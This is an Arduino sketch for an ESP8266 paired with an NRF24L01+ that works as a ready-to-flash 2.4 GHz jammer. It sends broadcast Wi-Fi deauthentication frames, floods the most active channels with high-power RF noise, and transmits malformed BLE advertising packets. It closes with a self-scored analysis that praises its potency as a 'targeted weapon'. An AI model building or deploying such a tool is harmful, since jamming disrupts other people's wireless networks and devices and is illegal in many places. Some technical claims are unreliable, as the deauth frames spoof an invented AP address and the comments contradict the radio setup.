// ESP8266 + NRF24L01+ Cooperative Jammer
// Concept: ESP8266 handles valid 802.11 deauth packets (Wi-Fi disruption)
// NRF24L01+ handles high-power wideband RF flooding (broadband jamming)
// This mitigates NRF24’s inability to craft 802.11 frames

// --- LIBRARIES ---
// These libraries provide the necessary functions to control the ESP8266 and NRF24L01.
#include <ESP8266WiFi.h>      // Core library for ESP8266 Wi-Fi functions.
extern "C" {
  #include "user_interface.h" // Provides low-level Wi-Fi functions, including raw packet injection.
}
#include <SPI.h>              // Serial Peripheral Interface, for communication between ESP8266 and NRF24L01.
#include <nRF24L01.h>         // Defines registers and constants for the NRF24L01 chip.
#include <RF24.h>             // High-level library for controlling the NRF24L01 module.

// --- NRF24L01+ CONFIGURATION ---
// Initializes the RF24 radio object, specifying the Chip Enable (CE) and Chip Select Not (CSN) pins.
// These pins are used by the ESP8266 to control the NRF24L01 module.
RF24 radio(D2, D1); // CE is on pin D2, CSN is on pin D1.

// --- JAMMING PAYLOADS ---
// These arrays define the data patterns that will be transmitted to cause interference.
uint8_t pattern_ff[32];       // A 32-byte payload of all 1s (0xFF). This is a simple, high-energy signal.
uint8_t pattern_random[32];   // A 32-byte payload of pseudo-random data, to disrupt more complex receivers.
// A malformed Bluetooth Low Energy (BLE) advertising packet. Transmitting this on BLE channels
// can disrupt or confuse nearby BLE devices trying to discover each other.
uint8_t pattern_ble_adv[32] = {
  0x02, 0x01, 0x06,
  0x03, 0x03, 0xAA, 0xFE,
  0x17, 0x16, 0xAA, 0xFE, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00
};

// --- ATTACK STATE VARIABLES ---
// These variables manage the state and timing of the different jamming attacks.
const uint8_t ble_adv_channels[] = {2, 26, 80}; // The three standard BLE advertising channels (physical channels, not Wi-Fi channels).
int channelScores[126] = {0};                 // Array to store the activity score for each of the 126 NRF24L01 channels.
uint8_t topChannels[5] = {1, 6, 11, 2, 80};   // Stores the 5 most active channels found by the scanner. Initialized to common Wi-Fi/BLE channels.
uint8_t ble_index = 0;                        // Index for cycling through the BLE advertising channels.
unsigned long lastScanTime = 0;               // Timestamp of the last channel scan.
unsigned long lastBleTime = 0;                // Timestamp of the last BLE packet transmission.
uint8_t attackIndex = 0;                      // Index for cycling through the top 5 active channels to attack.
unsigned long lastDeauth = 0;                 // Timestamp of the last Wi-Fi deauthentication packet transmission.

// --- WI-FI DEAUTHENTICATION ATTACK VARIABLES ---
// These define the MAC addresses used in the deauth attack.
const uint8_t fakeAPmac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22}; // A fake, hardcoded MAC address for the "Access Point".
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};       // The broadcast MAC address, to deauthenticate all clients in range.

// --- WI-FI DEAUTHENTICATION FUNCTION ---
// This function crafts and transmits a raw 802.11 deauthentication frame.
void sendDeauthESP(uint8_t* target, uint8_t* ap) {
  // The deauthentication packet structure.
  uint8_t packet[26] = {
    /* Frame Control */
    0xC0, 0x00,       // Type/Subtype: 0xC0 indicates a deauthentication frame.
    /* Duration */
    0x3A, 0x01,       // A standard duration value.
    /* Receiver/Destination Address */
    target[0], target[1], target[2], target[3], target[4], target[5],
    /* Transmitter/Source Address */
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
    /* BSSID */
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
    /* Fragment & Sequence Number */
    0x00, 0x00,
    /* Reason Code */
    0x07, 0x00        // Reason 7: "Class 3 frame received from nonassociated STA".
  };
  // This is the key function that injects the raw packet into the air, bypassing the standard Wi-Fi stack.
  wifi_send_pkt_freedom(packet, 26, 0);
}

// --- SETUP FUNCTION ---
// This function runs once when the ESP8266 boots up. It initializes hardware and variables.
void setup() {
  Serial.begin(115200); // Initialize serial communication for debugging (optional).

  // --- ESP8266 WI-FI INITIALIZATION ---
  // Configure the ESP8266's Wi-Fi for monitor mode to allow packet injection.
  wifi_set_opmode(STATION_MODE);      // Set to station mode initially.
  wifi_promiscuous_enable(0);         // Disable promiscuous mode.
  wifi_set_channel(1);                // Set a starting channel.
  wifi_promiscuous_enable(1);         // Re-enable promiscuous mode to capture all traffic.
  wifi_set_channel(1);                // Set channel again to ensure it's active.

  // --- NRF24L01+ PAYLOAD INITIALIZATION ---
  memset(pattern_ff, 0xFF, 32); // Fill the `pattern_ff` array with all 1s.

  // --- NRF24L01+ HARDWARE INITIALIZATION ---
  // Configure the NRF24L01 for high-power, unreliable, one-way transmission (ideal for jamming).
  radio.begin();
  radio.setAutoAck(false);            // Disable automatic acknowledgements. We don't care about replies.
  radio.setRetries(0, 0);             // Disable automatic retransmissions.
  radio.setPayloadSize(32);           // Set a fixed 32-byte payload size.
  radio.setDataRate(RF24_2MBPS);      // Set the highest data rate for maximum interference.
  radio.setPALevel(RF24_PA_MAX);      // Set the highest power amplifier level for maximum range.
  radio.setCRCLength(RF24_CRC_DISABLED); // Disable CRC checking. The data is garbage anyway.
  radio.disableDynamicPayloads();     // Use fixed payload size.
  radio.stopListening();              // Set the radio to transmit mode only.
}

// --- CHANNEL SCANNING FUNCTION ---
// This function scans all 126 NRF24L01 channels to find the most active ones.
void scanChannels() {
  // Iterate through every possible channel.
  for (uint8_t ch = 0; ch < 126; ch++) {
    radio.setChannel(ch);
    radio.startListening(); // Briefly listen on the channel.
    delayMicroseconds(200); // Wait a moment to detect a signal.
    // testCarrier() checks for a persistent radio signal on the current channel.
    if (radio.testCarrier()) {
      channelScores[ch]++; // If a signal is found, increment the score for this channel.
    }
    radio.stopListening(); // Stop listening and move to the next channel.
  }
  // This part of the code sorts the channels by their activity score to find the top 5.
  for (int i = 0; i < 5; i++) topChannels[i] = 0; // Clear the previous top channels.
  for (uint8_t ch = 0; ch < 126; ch++) {
    for (int i = 0; i < 5; i++) {
      if (channelScores[ch] > channelScores[topChannels[i]]) {
        // If the current channel has a higher score, insert it into the top 5 list.
        for (int j = 4; j > i; j--) topChannels[j] = topChannels[j - 1];
        topChannels[i] = ch;
        break;
      }
    }
  }
  // Reset scores for the next scan.
  memset(channelScores, 0, sizeof(channelScores));
}

// --- RF JAMMING FUNCTION ---
// This function floods a specific channel with garbage data.
void attackChannel(uint8_t chan) {
  radio.setChannel(chan); // Tune the radio to the target channel.
  // Use a constantly changing address to avoid being filtered.
  uint64_t addr = 0xF0F0F0F000 ^ millis();
  radio.openWritingPipe(addr);
  // Generate a new random pattern for every attack burst.
  for (int i = 0; i < 32; i++) {
    pattern_random[i] = (chan * i) ^ (millis() & 0xFF);
  }
  // Transmit the two jamming patterns back-to-back.
  radio.write(pattern_ff, 32);
  delayMicroseconds(150);
  radio.write(pattern_random, 32);
  delayMicroseconds(150);
}

// --- MAIN LOOP ---
// This function runs continuously after `setup()` is complete. It orchestrates the attacks.
void loop() {
  unsigned long now = millis(); // Get the current time.

  // --- CHANNEL SCANNING LOGIC ---
  // Every 3 seconds (3000 ms), rescan the channels to adapt to changing RF environments.
  if (now - lastScanTime > 3000) {
    scanChannels();
    lastScanTime = now;
    attackIndex = 0; // Reset the attack cycle to start with the most active channel.
  }

  // --- NRF24L01+ JAMMING LOGIC ---
  // Cycle through the top 5 active channels and attack them in sequence.
  attackChannel(topChannels[attackIndex % 5]);
  attackIndex++;

  // --- BLE JAMMING LOGIC ---
  // Every 5 milliseconds, send a malformed BLE packet on one of the advertising channels.
  if (now - lastBleTime > 5) {
    uint8_t ble_chan = ble_adv_channels[ble_index % 3]; // Cycle through BLE channels.
    radio.setChannel(ble_chan);
    radio.openWritingPipe(0xABABABAB00 ^ now); // Use a changing address.
    radio.write(pattern_ble_adv, 32); // Send the fake BLE packet.
    ble_index++;
    lastBleTime = now;
  }

  // --- WI-FI DEAUTH LOGIC ---
  // Every 300 milliseconds, send a Wi-Fi deauthentication packet.
  if (now - lastDeauth > 300) {
    sendDeauthESP(broadcast, fakeAPmac); // Send to everyone from the fake AP.
    lastDeauth = now;
  }
}

// --- CYBERSECURITY ANALYSIS ---
/*
 * This section provides a detailed analysis of the code from a cybersecurity perspective.
 * The scores are based on a comparison to other similar open-source projects and general
 * security principles. The scale is 1-10, where 1 is poor/simple and 10 is excellent/highly advanced.
 */

/*
 * 1. Implementation & Completeness: 8/10
 * 
 * Explanation: This score is high because the project is a fully-functional, multi-faceted attack tool.
 * It doesn't just implement one type of attack, but three distinct ones that run cooperatively.
 * - It correctly uses the ESP8266 for what it's good at: 802.11 packet injection.
 * - It correctly uses the NRF24L01+ for what it's good at: raw, high-power RF transmission.
 * - The code is self-contained and manages its own timing and targeting, requiring no user interaction after launch.
 * Many simple online projects only implement a basic deauth attack OR a simple RF flood on a single channel.
 * This code is significantly more complete by combining them and adding intelligent targeting.
 */

/*
 * 2. Effectiveness & Potency: 9/10
 * 
 * Explanation: The effectiveness of this tool is extremely high for its cost and simplicity.
 * - Layered Attack: By attacking both the protocol layer (Wi-Fi deauth) and the physical layer (RF noise),
 *   it can disable a very wide range of devices. A device immune to deauth attacks (e.g., using WPA3)
 *   would still be vulnerable to the raw RF jamming, and vice-versa.
 * - Adaptive Targeting: The `scanChannels()` function makes this tool "smart." Instead of blindly jamming
 *   all channels (which would dilute its power), it focuses its energy on the 5 most active channels.
 *   This is a critical feature that dramatically increases its potency compared to a simple, single-channel jammer.
 * - Multi-Protocol Disruption: Explicitly targeting Wi-Fi, general 2.4GHz, and BLE advertising channels
 *   ensures a very broad impact within its operational range.
 */

/*
 * 3. Stealth & Evasion: 3/10
 * 
 * Explanation: The score is low because the tool makes no attempt to hide its presence. Its very function
 * is to be as "loud" as possible on the radio spectrum.
 * - Deauth Frames: While the source MAC address is fake, the deauthentication frames themselves are a clear
 *   and obvious sign of a targeted attack that can be detected by any Wi-Fi Intrusion Detection System (IDS).
 * - RF Noise: The high-power, continuous signal from the NRF24L01+ would be immediately visible on any
 *   spectrum analyzer as abnormal, wideband noise. This makes the physical device relatively easy to locate
 *   with the right equipment (a technique known as "fox hunting").
 * - Predictable Patterns: While the jamming data is somewhat randomized, the timing of the attacks is fixed
 *   in the code, which could potentially be fingerprinted.
 */

/*
 * 4. Sophistication & Novelty: 7/10
 * 
 * Explanation: While the individual techniques (deauth, jamming) are well-known, the combination and
 * implementation here are more sophisticated than typical hobbyist projects.
 * - Cooperative Model: The concept of using two different radio modules for their specialized strengths
 *   is a clever design choice that overcomes the limitations of each individual module.
 * - Intelligent Scanning: The adaptive channel scanning is the most sophisticated part of this code.
 *   It elevates the tool from a blunt instrument to a targeted weapon.
 * - Low-Level Control: The use of `wifi_send_pkt_freedom` demonstrates a deeper understanding of the hardware
 *   capabilities than simply using standard library functions.
 * It is not novel in the sense of a zero-day exploit, but it is a novel combination of existing techniques
 * in a low-cost, accessible platform.
 */
